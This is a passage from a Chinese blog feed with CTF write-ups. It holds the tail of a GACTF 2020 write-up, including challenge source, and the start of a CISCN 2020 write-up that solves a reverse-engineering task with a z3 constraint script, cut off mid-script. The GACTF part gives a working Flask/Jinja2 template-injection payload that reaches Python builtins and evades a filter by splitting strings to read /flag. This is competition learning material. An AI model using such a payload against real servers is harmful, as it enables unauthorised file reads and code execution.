这一模块来执行命令读取信息的，但不知道为啥<code>read()</code>就被拦了。</p><p><img src="/2020/08/31/CTF_2020GACTF/image-20200830155903233.png" alt="os"></p><p><img src="/2020/08/31/CTF_2020GACTF/image-20200830155932359.png" alt="read"></p><p>最后问了队里大师傅，发现换成<code>open</code>就完事了，太草了！</p><p><strong>Payload:</strong></p><pre><code>name={{[].__class__.__bases__[0].__subclasses__()[127].__init__.__globals__.__builtins__["op""en"]("/fl""ag").read()}}</code></pre><p><img src="/2020/08/31/CTF_2020GACTF/image-20200830154108093.png" alt="flag"></p><p><code>GACTF{fac9165b6a2b5ac8bd3b99fad0619366}</code></p><p>后面再整理一下 flask 的 SSTI 常用 payload 及绕过技巧吧（</p><p><em>大概率会咕咕咕（</em></p><h3 id="EZFLASK"><a href="#EZFLASK" class="headerlink" title="EZFLASK"></a>EZFLASK</h3><blockquote><p>flask&amp;flask</p><p>China：<br> 124.70.206.91 10000-10009<br> Overseas：<br> 149.28.226.175 10000-10009</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token keyword">import</span> requests<span class="token keyword">from</span> waf <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> timeapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/ctfhint'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">ctf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    hint <span class="token operator">=</span>xxxx <span class="token comment" spellcheck="true"># hints</span>    trick <span class="token operator">=</span> xxxx <span class="token comment" spellcheck="true"># trick</span>    <span class="token keyword">return</span> trick@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># app.txt</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/eval'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">my_eval</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># post eval</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span>xxxxxx<span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># Secret</span><span class="token keyword">def</span> <span class="token function">admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># admin requests</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">)</span></code></pre><p>他这个 flask 服务器为 Werkzeug/1.0.1 Python/2.7.18。</p><p>访问 <code>/ctfhint</code>，得到</p><pre><code>too young too simple</code></pre><p>POST <code>/eval</code></p><pre><code>post eval</code></pre><p>没找到哪里能用？</p><p><code>admin</code> 没找到 route 在哪，并不知道怎么用 emmm。</p><p><em>（等复现嘤嘤嘤</em></p><hr><p>大概就这么多，开学了喵呜~</p><p>（溜了溜了</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | 2020 CISCN初赛 Z3&amp;LFSR WriteUp</title>
      <link href="/2020/08/27/CTF_2020CISCN_preliminary/"/>
      <url>/2020/08/27/CTF_2020CISCN_preliminary/</url>
      
        <content type="html"><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>喵呜，好久没来写博客了咕咕咕（这就来除草了！</p><p>前不久水了一波 CISCN 线上初赛，感谢队友带我玩带我飞~</p><p>这里来写一写 Z3、LFSR 这两题的 WriteUp，顺便记录一下用到的 Z3、SageMath 求解工具喵。</p><hr><h2 id="Z3"><a href="#Z3" class="headerlink" title="Z3"></a>Z3</h2><p>首先丢进 IDA 看一看，首先将输入的 flag 分别存放在 v46 到 v87 变量内，而后是这些变量组成的线性方程，最后与 <code>Dst</code> 的结果比较，正确则输出 <code>win</code>。</p><p>其中<code>Dst</code>及其之后对应的那部分空间就是方程的值，将数据抠出来求解就完事了！</p><p><img src="/2020/08/27/CTF_2020CISCN_preliminary/z3_1.png" alt="z3_1"></p><p><img src="/2020/08/27/CTF_2020CISCN_preliminary/z3_2.png" alt="z3_2"></p><p>本来想用 MATLAB 之类来求解的，但看到题目名字叫 z3，搜了一下，果然有个叫 <strong>z3 的求解器</strong>，于是直接用它来约束求解即可。</p><p>而且这个 z3 还挺强大的亚子。。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> z3 <span class="token keyword">import</span> <span class="token operator">*</span>solver <span class="token operator">=</span> Solver<span class="token punctuation">(</span><span class="token punctuation">)</span>v46 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[0]'</span><span class="token punctuation">)</span>v47 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[1]'</span><span class="token punctuation">)</span>v48 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[2]'</span><span class="token punctuation">)</span>v49 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[3]'</span><span class="token punctuation">)</span>v50 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[4]'</span><span class="token punctuation">)</span>v51 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[5]'</span><span class="token punctuation">)</span>v52 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[6]'</span><span class="token punctuation">)</span>v53 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[7]'</span><span class="token punctuation">)</span>v54 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[8]'</span><span class="token punctuation">)</span>v55 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[9]'</span><span class="token punctuation">)</span>v56 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[10]'</span><span class="token punctuation">)</span>v57 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[11]'</span><span class="token punctuation">)</span>v58 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[12]'</span><span class="token punctuation">)</span>v59 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[13]'</span><span class="token punctuation">)</span>v60 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[14]'</span><span class="token punctuation">)</span>v61 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[15]'</span><span class="token punctuation">)</span>v62 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[16]'</span><span class="token punctuation">)</span>v63 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[17]'</span><span class="token punctuation">)</span>v64 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[18]'</span><span class="token punctuation">)</span>v65 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[20]'</span><span class="token punctuation">)</span>v66 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[21]'</span><span class="token punctuation">)</span>v67 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[22]'</span><span class="token punctuation">)</span>v68 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[23]'</span><span class="token punctuation">)</span>v69 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[24]'</span><span class="token punctuation">)</span>v70 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[25]'</span><span class="token punctuation">)</span>v71 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[26]'</span><span class="token punctuation">)</span>v72 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[27]'</span><span class="token punctuation">)</span>v73 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[28]'</span><span class="token punctuation">)</span>v74 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[29]'</span><span class="token punctuation">)</span>v75 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[30]'</span><span class="token punctuation">)</span>v76 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[31]'</span><span class="token punctuation">)</span>v77 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[32]'</span><span class="token punctuation">)</span>v78 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[33]'</span><span class="token punctuation">)</span>v79 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[34]'</span><span class="token punctuation">)</span>v80 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[35]'</span><span class="token punctuation">)</span>v81 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[36]'</span><span class="token punctuation">)</span>v82 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[37]'</span><span class="token punctuation">)</span>v83 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[38]'</span><span class="token punctuation">)</span>v84 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[39]'</span><span class="token punctuation">)</span>v85 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[40]'</span><span class="token punctuation">)</span>v86 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[41]'</span><span class="token punctuation">)</span>v87 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[42]'</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>v46 <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>v46 <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>v47 <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>v47 <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>v48 <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>v48 <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>v77 <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>v77 <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>v78 <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>v78 <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>v79 <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>v79 <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>v76 <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>v76 <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">34</span> <span class="token operator">*</span> v49 <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> v46 <span class="token operator">+</span> <span class="token number">53</span> <span class="token operator">*</span> v47 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> v48 <span class="token operator">+</span> <span class="token number">58</span> <span class="token operator">*</span> v50 <span class="token operator">+</span> <span class="token number">36</span> <span class="token operator">*</span> v51 <span class="token operator">+</span> v52 <span class="token operator">==</span> <span class="token number">0x4f17</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">27</span> <span class="token operator">*</span> v50 <span class="token operator">+</span> <span class="token number">73</span> <span class="token operator">*</span> v49 <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> v48 <span class="token operator">+</span> <span class="token number">83</span> <span class="token operator">*</span> v46 <span class="token operator">+</span> <span class="token number">85</span> <span class="token operator">*</span> v47 <span class="token operator">+</span> <span class="token number">96</span> <span class="token operator">*</span> v51 <span class="token operator">+</span> <span class="token number">52</span> <span class="token operator">*</span> v52 <span class="token operator">==</span> <span class="token number">0x9cf6</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">24</span> <span class="token operator">*</span> v48 <span class="token operator">+</span> <span class="token number">78</span> <span class="token operator">*</span> v46 <span class="token operator">+</span> <span class="token number">53</span> <span class="token operator">*</span> v47 <span class="token operator">+</span> <span class="token number">36</span> <span class="token operator">*</span> v49 <span class="token operator">+</span> <span class="token number">86</span> <span class="token operator">*</span> v50 <span class="token operator">+</span> <span class="token number">25</span> <span class="token operator">*</span> v51 <span class="token operator">+</span> <span class="token number">46</span> <span class="token operator">*</span> v52 <span class="token operator">==</span> <span class="token number">0x8ddb</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">78</span> <span class="token operator">*</span> v47 <span class="token operator">+</span> <span class="token number">39</span> <span class="token operator">*</span> v46 <span class="token operator">+</span> <span class="token number">52</span> <span class="token operator">*</span> v48 <span class="token operator">+</span> <span class="token number">9</span> <span class="token operator">*</span> v49 <span class="token operator">+</span> <span class="token number">62</span> <span class="token operator">*</span> v50 <span class="token operator">+</span> <span class="token number">37</span> <span class="token operator">*</span> v51 <span class="token operator">+</span> <span class="token number">84</span> <span class="token operator">*</span> v52 <span class="token operator">==</span> <span class="token number">0x8ea6</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">48</span> <span class="token operator">*</span> v50 <span class="token operator">+</span> <span class="token number">14</span> <span class="token operator">*</span> v48 <span class="token operator">+</span> <span class="token number">23</span> <span class="token operator">*</span> v46 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> v47 <span class="token operator">+</span> <span class="token number">74</span> <span class="token operator">*</span> v49 <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> v51 <span class="token operator">+</span> <span class="token number">83</span> <span class="token operator">*</span> v52 <span class="token operator">==</span> <span class="token number">0x6929</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">15</span> <span class="token operator">*</span> v51 <span class="token operator">+</span> <span class="token number">48</span> <span class="token operator">*</span> v50 <span class="token operator">+</span> <span class="token number">92</span> <span class="token operator">*</span> v48 <span class="token operator">+</span> <span class="token number">85</span> <span class="token operator">*</span> v47 <span class="token operator">+</span> <span class="token number">27</span> <span class="token operator">*</span> v46 <span class="token operator">+</span> <span class="token number">42</span> <span class="token operator">*</span> v49 <span class="token operator">+</span> <span class="token number">72</span> <span class="token operator">*</span> v52 <span class="token operator">==</span> <span class="token number">0x9911</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">26</span> <span class="token operator">*</span> v51 <span class="token operator">+</span> <span class="token number">67</span> <span class="token operator">*</span> v49 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> v47 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v46 <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">*</span> v48 <span class="token operator">+</span> <span class="token number">68</span> <span class="token operator">*</span> v52 <span class="token operator">==</span> <span class="token number">0x40a2</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">34</span> <span class="token operator">*</span> v56 <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> v53 <span class="token operator">+</span> <span class="token number">53</span> <span class="token operator">*</span> v54 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> v55 <span class="token operator">+</span> <span class="token number">58</span> <span class="token operator">*</span> v57 <span class="token operator">+</span> <span class="token number">36</span> <span class="token operator">*</span> v58 <span class="token operator">+</span> v59 <span class="token operator">==</span> <span class="token number">0x2f3e</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">27</span> <span class="token operator">*</span> v57 <span class="token operator">+</span> <span class="token number">73</span> <span class="token operator">*</span> v56 <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> v55 <span class="token operator">+</span> <span class="token number">83</span> <span class="token operator">*</span> v53 <span class="token operator">+</span> <span class="token number">85</span> <span class="token operator">*</span> v54 <span class="token operator">+</span> <span class="token number">96</span> <span class="token operator">*</span> v58 <span class="token operator">+</span> <span class="token number">52</span> <span class="token operator">*</span> v59 <span class="token operator">==</span> <span class="token number">0x62b6</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">24</span> <span class="token operator">*</span> v55 <span class="token operator">+</span> <span class="token number">78</span> <span class="token operator">*</span> v53 <span class="token operator">+</span> <span class="token number">53</span> <span class="token operator">*</span> v54 <span class="token operator">+</span> <span class="token number">36</span> <span class="token operator">*</span> v56 <span class="token operator">+</span> <span class="token number">86</span> <span class="token operator">*</span> v57 <span class="token operator">+</span> <span class="token number">25</span> <span class="token operator">*</span> v58 <span class="token operator">+</span> <span class="token number">46</span> <span class="token operator">*</span> v59 <span class="token operator">==</span> <span class="token number">0x4b82</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">78</span> <span class="token operator">*</span> v54 <span class="token operator">+</span> <span class="token number">39</span> <span class="token operator">*</span> v53 <span class="token operator">+</span> <span class="token number">52</span> <span class="token operator">*</span> v55 <span class="token operator">+</span> <span class="token number">9</span> <span class="token operator">*</span> v56 <span class="token operator">+</span> <span class="token number">62</span> <span class="token operator">*</span> v57 <span class="token operator">+</span> <span class="token number">37</span> <span class="token operator">*</span> v58 <span class="token operator">+</span> <span class="token number">84</span> <span class="token operator">*</span> v59 <span class="token operator">==</span> <span class="token number">0x486c</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">48</span> <span class="token operator">*</span> v57 <span class="token operator">+</span> <span class="token number">14</span> <span class="token operator">*</span> v55 <span class="token operator">+</span> <span class="token number">23</span> <span class="token operator">*</span> v53 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> v54 <span class="token operator">+</span> <span class="token number">74</span> <span class="token operator">*</span> v56 <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> v58 <span class="token operator">+</span> <span class="token number">83</span> <span class="token operator">*</span> v59 <span class="token operator">==</span> <span class="token number">0x4002</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">15</span> <span class="token operator">*</span> v58 <span class="token operator">+</span> <span class="token number">48</span> <span class="token operator">*</span> v57 <span class="token operator">+</span> <span class="token number">92</span> <span class="token operator">*</span> v55 <span class="token operator">+</span> <span class="token number">85</span> <span class="token operator">*</span> v54 <span class="token operator">+</span> <span class="token number">27</span> <span class="token operator">*</span> v53 <span class="token operator">+</span> <span class="token number">42</span> <span class="token operator">*</span> v56 <span class="token operator">+</span> <span class="token number">72</span> <span class="token operator">*</span> v59 <span class="token operator">==</span> <span class="token number">0x52d7</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">26</span> <span class="token operator">*</span> v58 <span class="token operator">+</span> <span class="token number">67</span> <span class="token operator">*</span> v56 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> v54 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v53 <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">*</span> v55 <span class="token operator">+</span> <span class="token number">68</span> <span class="token operator">*</span> v59 <span class="token operator">==</span> <span class="token number">0x2def</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">34</span> <span class="token operator">*</span> v63 <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> v60 <span class="token operator">+</span> <span class="token number">53</span> <span class="token operator">*</span> v61 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> v62 <span class="token operator">+</span> <span class="token number">58</span> <span class="token operator">*</span> v64 <span class="token operator">+</span> <span class="token number">36</span> <span class="token operator">*</span> v65 <span class="token operator">+</span> v66 <span class="token operator">==</span> <span class="token number">0x28dc</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">27</span> <span class="token operator">*</span> v64 <span class="token operator">+</span> <span class="token number">73</span> <span class="token operator">*</span> v63 <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> v62 <span class="token operator">+</span> <span class="token number">83</span> <span class="token operator">*</span> v60 <span class="token operator">+</span> <span class="token number">85</span> <span class="token operator">*</span> v61 <span class="token operator">+</span> <span class="token number">96</span> <span class="token operator">*</span> v65 <span class="token operator">+</span> <span class="token number">52</span> <span class="token operator">*</span> v66 <span class="token operator">==</span> <span class="token number">0x640d</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">24</span> <span class="token operator">*</span> v62 <span class="token operator">+</span> <span class="token number">78</span> <span class="token operator">*</span> v60 <span class="token operator">+</span> <span class="token number">53</span> <span class="token operator">*</span> v61 <span class="token operator">+</span> <span class="token number">36</span> <span class="token operator">*</span> v63 <span class="token operator">+</span> <span class="token number">86</span> <span class="token operator">*</span> v64 <span class="token operator">+</span> <span class="token number">25</span> <span class="token operator">*</span> v65 <span class="token operator">+</span> <span class="token number">46</span> <span class="token operator">*</span> v66 <span class="token operator">==</span> <span class="token number">0x528f</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">78</span> <span class="token operator">*</span> v61 <span class="token operator">+</span> <span class="token number">39</span> <span class="token operator">*</span> v60 <span class="token operator">+</span> <span class="token number">52</span> <span class="token operator">*</span> v62 <span class="token operator">+</span> <span class="token number">9</span> <span class="token operator">*</span> v63 <span class="token operator">+</span> <span class="token number">62</span> <span class="token operator">*</span> v64 <span class="token operator">+</span> <span class="token number">37</span> <span class="token operator">*</span> v65 <span class="token operator">+</span> <span class="token number">84</span> <span class="token operator">*</span> v66 <span class="token operator">==</span> <span class="token number">0x613b</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">48</span> <span class="token operator">*</span> v64 <span class="token operator">+</span> <span class="token number">14</span> <span class="token operator">*</span> v62 <span class="token operator">+</span> <span class="token number">23</span> <span class="token operator">*</span> v60 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> v61 <span class="token operator">+</span> <span class="token number">74</span> <span class="token operator">*</span> v63 <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> v65 <span class="token operator">+</span> <span class="token number">83</span> <span class="token operator">*</span> v66 <span class="token operator">==</span> <span class="token number">0x4781</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">15</span> <span class="token operator">*</span> v65 <span class="token operator">+</span> <span class="token number">48</span> <span class="token operator">*</span> v64 <span class="token operator">+</span> <span class="token number">92</span> <span class="token operator">*</span> v62 <span class="token operator">+</span> <span class="token number">85</span> <span class="token operator">*</span> v61 <span class="token operator">+</span> <span class="token number">27</span> <span class="token operator">*</span> v60 <span class="token operator">+</span> <span class="token number">42</span> <span class="token operator">*</span> v63 <span class="token operator">+</span> <span class="token number">72</span> <span class="token operator">*</span> v66 <span class="token operator">==</span> <span class="token number">0x6b17</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">26</span> <span class="token operator">*</span> v65 <span class="token operator">+</span> <span class="token number">67</span> <span class="token operator">*</span> v63 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> v61 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v60 <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">*</span> v62 <span class="token operator">+</span> <span class="token number">68</span> <span class="token operator">*</span> v66 <span class="token operator">==</span> <span class="token number">0x3237</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">34</span> <span class="token operator">*</span> v70 <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> v67 <span class="token operator">+</span> <span class="token number">53</span> <span class="token operator">*</span> v68 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> v69 <span class="token operator">+</span> <span class="token number">58</span> <span class="token operator">*</span> v71 <span class="token operator">+</span> <span class="token number">36</span> <span class="token operator">*</span> v72 <span class="token operator">+</span> v73 <span class="token operator">==</span> <span class="token number">0x2a93</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">27</span> <span class="token operator">*</span> v71 <span class="token operator">+</span> <span class="token number">73</span> <span class="token operator">*</span> v70 <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> v69 <span class="token operator">+</span> <span class="token number">83</span> <span class="token operator">*</span> v67 <span class="token operator">+</span> <span class="token number">85</span> <span class="token operator">*</span> v68 <span class="token operator">+</span> <span class="token number">96</span> <span class="token operator">*</span> v72 <span class="token operator">+</span> <span class="token number">52</span> <span class="token operator">*</span> v73 <span class="token operator">==</span> <span class="token number">0x615f</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">24</span> <span class="token operator">*</span> v69 <span class="token operator">+</span> <span class="token number">78</span> <span class="token operator">*</span> v67 <span class="token operator">+</span> <span class="token number">53</span> <span class="token operator">*</span> v68 <span class="token operator">+</span> <span class="token number">36</span> <span class="token operator">*</span> v70 <span class="token operator">+</span> <span class="token number">86</span> <span class="token operator">*</span> v71 <span class="token operator">+</span> <span class="token number">25</span> <span class="token operator">*</span> v72 <span class="token operator">+</span> <span class="token number">46</span> <span class="token operator">*</span> v73 <span class="token operator">==</span> <span class="token number">0x50be</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">78</span> <span class="token operator">*</span> v68 <span class="token operator">+</span> <span class="token number">39</span> <span class="token operator">*</span> v67 <span class="token operator">+</span> <span class="token number">52</span> <span class="token operator">*</span> v69 <span class="token operator">+</span> <span class="token number">9</span> <span class="token operator">*</span> v70 <span class="token operator">+</span> <span class="token number">62</span> <span class="token operator">*</span> v71 <span class="token operator">+</span> <span class="token number">37</span> <span class="token operator">*</span> v72 <span class="token operator">+</span> <span class="token number">84</span> <span class="token operator">*</span> v73 <span class="token operator">==</span> <span class="token number">0x598e</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">48</span> <span class="token operator">*</span> v71 <span class="token operator">+</span> <span class="token number">14</span> <span class="token operator">*</span> v69 <span class="token operator">+</span> <span class="token number">23</span> <span class="token operator">*</span> v67 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> v68 <span class="token operator">+</span> <span class="token number">74</span> <span class="token operator">*</span> v70 <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> v72 <span class="token operator">+</span> <span class="token number">83</span> <span class="token operator">*</span> v73 <span class="token operator">==</span> <span class="token number">0x4656</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">15</span> <span class="token operator">*</span> v72 <span class="token operator">+</span> <span class="token number">48</span> <span class="token operator">*</span> v71 <span class="token operator">+</span> <span class="token number">92</span> <span class="token operator">*</span> v69 <span class="token operator">+</span> <span class="token number">85</span> <span class="token operator">*</span> v68 <span class="token operator">+</span> <span class="token number">27</span> <span class="token operator">*</span> v67 <span class="token operator">+</span> <span class="token number">42</span> <span class="token operator">*</span> v70 <span class="token operator">+</span> <span class="token number">72</span> <span class="token operator">*</span> v73 <span class="token 